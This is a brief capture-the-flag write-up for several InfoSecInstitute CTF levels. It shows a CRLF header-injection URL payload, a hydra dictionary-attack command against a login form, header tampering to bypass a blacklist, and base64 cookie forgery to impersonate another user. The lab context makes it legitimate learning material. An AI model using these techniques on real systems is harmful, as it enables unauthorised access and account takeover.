# InfoSecInstituteCTF
I wanted to go from the hardest but anyway the order is mixed

# Level13
Try adding a remote URL in the appropriate GET parameter

It's pretty strange that level13 leads to ex13-task.php, while others lead to ex#.php :)
Lets visit exp13.php
"Get a Hint"

Lets try few tricks :


http://ctf.infosecinstitute.com/ctf2/exercises/ex13-task.php?redirect=test


Nothing


http://ctf.infosecinstitute.com/ctf2/exercises/ex13.php?redirect=test


Bingo :)
Now we have to inject the header :


http://ctf.infosecinstitute.com/ctf2/exercises/ex13.php?redirect=%0d%0a%20CostumHeader:INJECTED



# Level12


This was a very easy one, dictionary attack on POST request, lets hit hydra :)


https://i.imgur.com/pzbvkWd.png


Command:


hydra ctf.infosecinstitute.com http-form-post"/ctf2/exercises/ex12.php:username=^USER^&password=^PASS^&logIn=Login:combination" -L users.txt -P password.txt -t 10 -w 30 -o hydra-http-post-attack.txt



# Level11

This is getting easier and easier, We've been blacklisted, and hint says it all.

Check the header, change no to yes, and that is it :)


# Level10


Hate DOM XSS /skip



# Level 9


As we where logged in we had to check the cookie, to see whats going on, and you can notice user=Sk9ITitET0U%3D.


%3D equals "=" so this could be base64, decoding it we get "JOHN+DOE". Next step encode "MARY+JANE" = "TUFSWStKQU5F"



# Level8 

Too lazy...



